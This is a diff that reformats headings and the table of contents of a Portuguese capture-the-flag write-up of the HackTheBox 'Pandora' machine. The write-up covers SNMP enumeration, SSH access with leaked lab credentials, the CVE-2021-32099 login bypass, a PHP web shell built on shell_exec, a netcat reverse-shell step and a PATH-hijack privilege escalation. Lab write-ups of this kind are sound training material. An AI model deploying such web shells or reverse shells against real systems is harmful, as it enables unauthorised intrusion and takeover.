@@ -1,42 +1,43 @@
-1. [Resolução da máquina **Pandora**](#resolução-da-máquina-pandora) 1. [Máquina EASY (hackthebox.com)](#máquina-easy-hacktheboxcom) 2. [by **_JavaliMZ_** - 02/02/2022](#by-javalimz---02022022)
-2. [Introdução](#introdução)
-3. [Enumeração](#enumeração)
-    1. [Nmap](#nmap)
-    2. [VirtualHosting e WebPage](#virtualhosting-e-webpage)
-    3. [SNMP](#snmp)
-4. [Getting Shell](#getting-shell)
-    1. [SSH](#ssh)
-    2. [Enumeração do sistema](#enumeração-do-sistema)
-    3. [VirtualHost](#virtualhost)
-    4. [PortForwarding](#portforwarding)
-    5. [CVE-2021-32099](#cve-2021-32099)
-    6. [RCE com usuário **matt**](#rce-com-usuário-matt)
-        1. [Estabilizar o Reverse Shell](#estabilizar-o-reverse-shell)
-5. [Escalada de privilégio](#escalada-de-privilégio)
-    1. [Path Hijacking](#path-hijacking)
-        1. [Não funcionou! Porquê?](#não-funcionou-porquê)
-
 ![](Assets/HTB-Linux-Easy-Pandora/icon.png)
 
 <img src="https://img.shields.io/badge/Pandora-HackTheBox-green?style=plastic" width="200">
 
-# Resolução da máquina **Pandora**
+<h1> Resolução da máquina <b>Pandora</b></h1>
 
-#### Máquina EASY (hackthebox.com)
+<h4> Máquina EASY (hackthebox.com)</h4>
 
-#### by **_JavaliMZ_** - 02/02/2022
-
----
+<h4> by <i><b>JavaliMZ</b></i> - 02/02/2022</h4>
 
 ---
 
-# Introdução
+---
+
+- [1. Introdução](#1-introdução)
+- [2. Enumeração](#2-enumeração)
+  - [2.1. Nmap](#21-nmap)
+  - [2.2. VirtualHosting e WebPage](#22-virtualhosting-e-webpage)
+  - [2.3. SNMP](#23-snmp)
+- [3. Getting Shell](#3-getting-shell)
+  - [3.1. SSH](#31-ssh)
+  - [3.2. Enumeração do sistema](#32-enumeração-do-sistema)
+  - [3.3. VirtualHost](#33-virtualhost)
+  - [3.4. PortForwarding](#34-portforwarding)
+  - [3.5. CVE-2021-32099](#35-cve-2021-32099)
+  - [3.6. RCE com usuário **matt**](#36-rce-com-usuário-matt)
+    - [3.6.1. Estabilizar o Reverse Shell](#361-estabilizar-o-reverse-shell)
+- [4. Escalada de privilégio](#4-escalada-de-privilégio)
+  - [4.1. Path Hijacking](#41-path-hijacking)
+    - [4.1.1. Não funcionou! Porquê?](#411-não-funcionou-porquê)
+
+---
+
+# 1. Introdução
 
 Olá pessoal! Já faz um tempo desde que escrevi um writeup, mas decidi escrever este porque a máquina é relativamente simples e apresenta conceitos interessantes. Além disso, até o momento em que escrevo este artigo, eu tinha apenas uma máquina Linux, enquanto possuía sete máquinas Windows. Então, decidi que era hora de criar novo conteúdo.
 
-# Enumeração
+# 2. Enumeração
 
-## Nmap
+## 2.1. Nmap
 
 Seguindo a metodologia padrão, iniciamos a enumeração das portas da máquina utilizando o **nmap**:
 
@@ -48,7 +49,7 @@ Após a execução do **nmap**, foi identificado que aparentemente apenas duas p
 
 Utilizando a ferramenta _whatweb_, foram encontrados dois endereços de e-mail relacionados à máquina: *contact@panda.htb* e *support@panda.htb*. Isso pode indicar a presença de um servidor de e-mail SMTP ou de Virtual Hosting. Acerca do serviço de e-mail, não existe nenhuma porta relacionada aberta. Como se trata de uma máquina de dificuldade fácil, vamos descartar a possibilidade de existir um servidor de e-mail SMTP.
 
-## VirtualHosting e WebPage
+## 2.2. VirtualHosting e WebPage
 
 Para verificar se existe Virtual Hosting, vamos começar pelo básico: adicionar o host ao arquivo /etc/hosts. Temos um potencial hostname válido, o **panda.htb**
 
@@ -94,7 +95,7 @@ Encontramos a confirmação de que uma porta está aberta! A porta UDP 161. Exis
 
 Ambos realizam a mesma tarefa, mas o snmpwalk apresenta o resultado em bruto, o que não é agradável à vista. Portanto, recomendo o uso do snmp-check para a enumeração do serviço SNMP.
 
-## SNMP
+## 2.3. SNMP
 
 Já agora, o que é este serviço?
 
@@ -115,9 +116,9 @@ No meio de um pouco mais de 1200 linhas, podemos ver duas informações relevant
 -   Está a ser executado por uma tarefa cronica um comando **"host_check"** e vemos em texto claro possíveis credenciais... **_daniel:HotelBabylon23_**
 -   Existe realmente um serviço de virtualhosting a rodar na porta 53. Ainda não sabemos se é relevante ou não.
 
-# Getting Shell
+# 3. Getting Shell
 
-## SSH
+## 3.1. SSH
 
 A porta SSH encontra-se aberta, e temos credenciais. Vamos simplesmente tentar fazer login via SSH.
 
@@ -129,7 +130,7 @@ Estamos na máquina!
 
 ![foothold](Assets/HTB-Linux-Easy-Pandora/foothold.png)
 
-## Enumeração do sistema
+## 3.2. Enumeração do sistema
 
 Após meia dúzia de comandos pela máquina, percebi o seguinte:
 
@@ -137,7 +138,7 @@ Após meia dúzia de comandos pela máquina, percebi o seguinte:
 
 Existe um binário bastante suspeito! pandora\*backup. É SUID. Significa que, neste caso, o usuário "\*\*\_matt**\*" executa este ficheiro temporariamente enquanto usuário "**_root_**". Logo, se conseguirmos ser "**_matt_\*\*", podemos tentar ver o que se passa com o binário, e se este apresenta algum tipo de vulnerabilidade.
 
-## VirtualHost
+## 3.3. VirtualHost
 
 Agora que estamos na máquina, podemos verificar se existe virtual hosting. Para isso, tenho feito da seguinte maneira:
 
@@ -170,7 +171,7 @@ Pode servir para diversas coisas. Pode o novo site ter um serviço com credencia
 -   O site principal, aberto ao público, não tem nada de relevante, não tem pontos de entrada.
 -   O segundo site, apenas acessível pelo localhost, tem como proprietário e "_AssignUserID_" o usuário "**_matt_**". Significa que tudo o que for feito nesta página será executado por "**_matt_**"!. Se for encontrado vulnerabilidades, podemos até executar código (RCE) com o usuário "**_matt_**".
 
-## PortForwarding
+## 3.4. PortForwarding
 
 Para fazer port forwarding, podemos usar uma ferramenta que nunca me falhou, é fácil de usar e é multi plataforma: O "**_Chisel_**". Mas para este caso nem vai ser necessário, porque estamos na máquina via SSH, e o próprio SSH tem a opção de port forwarding. Para isso, basta terminar a conexão actual com a máquina vítima, e entrar novamente com uma flag a mais. A flag "**_-L_**"
 
@@ -195,7 +196,7 @@ Pesquisando com a ferramenta "**_searchsploit_**", não foi possível encontrar 
 
 ![pandoraexposures](Assets/HTB-Linux-Easy-Pandora/pandoraexposures.png)
 
-## CVE-2021-32099
+## 3.5. CVE-2021-32099
 
 Esta vulnerabilidade parece perfeita para o nosso caso. A versão é exatamente a mesma, e permite um usuário random não autenticado entrar sem password nem nada.
 
@@ -209,7 +210,7 @@ Pelos vistos basta entrar na página normal de login, e adicionar à URL **http:
 
 Depois voltar á página inicial de login e já está... **http://localhost/pandora_console/**
 
-## RCE com usuário **matt**
+## 3.6. RCE com usuário **matt**
 
 ![filemanager](Assets/HTB-Linux-Easy-Pandora/filemanager.png)
 
@@ -219,8 +220,8 @@ Para executar comandos, é bastante simples. No File manager, é só fazer o upl
 # Existe mil e uma forma de executar comandos, dependendo de como está montado o serviço PHP. Para dar apenas 2 exemplos:
 # Para RCE, através de um parâmetro:
 <?php
-	 echo "\nURL Shell... url?cmd=<command>\n\n";
-	 echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+     echo "\nURL Shell... url?cmd=<command>\n\n";
+     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 
 # Para diretamente ter o reverse shell:
@@ -235,7 +236,7 @@ kali@kali: >     nc -lvnp 443
 kali@kali: >     curl http://localhost/pandora_console/images/shell.php
 ```
 
-### Estabilizar o Reverse Shell
+### 3.6.1. Estabilizar o Reverse Shell
 
 ```bash
 script /dev/null -c bash
@@ -248,7 +249,7 @@ reset
 stty rows 40 columns 170  # Tem corresponder ao vosso ecrã (stty -a numa consola do Kali)
 ```
 
-# Escalada de privilégio
+# 4. Escalada de privilégio
 
 Agora que somos matt, podemos analisar o tal binário pandora_backup
 
@@ -260,7 +261,7 @@ Este parece ser um simples comando "**_tar_**" que se colou a uma palavra "clien
 
 O que isto quer dizer?
 
-## Path Hijacking
+## 4.1. Path Hijacking
 
 Sabemos que o binário pandora_backup usa o tar. Onde se encontra isso?
 
@@ -290,7 +291,7 @@ Assim, basta criar um executável de nome "**_tar_**" numa pasta qualquer, e exe
 
 ![pathhijacknotwork](Assets/HTB-Linux-Easy-Pandora/pathhijacknotwork.png)
 
-#### Não funcionou! Porquê?
+### 4.1.1. Não funcionou! Porquê?
 
 Sinceramente não sei, o que sei é que pelo ssh funcionou nesta máquina... Quando vi que não funcionou, procurei outra solução. criei uma chave id_rsa só para ter melhor conexão, conectei-me via SSH e o mesmo exploit funcionou... OK. Mistérios do Hacking!
 
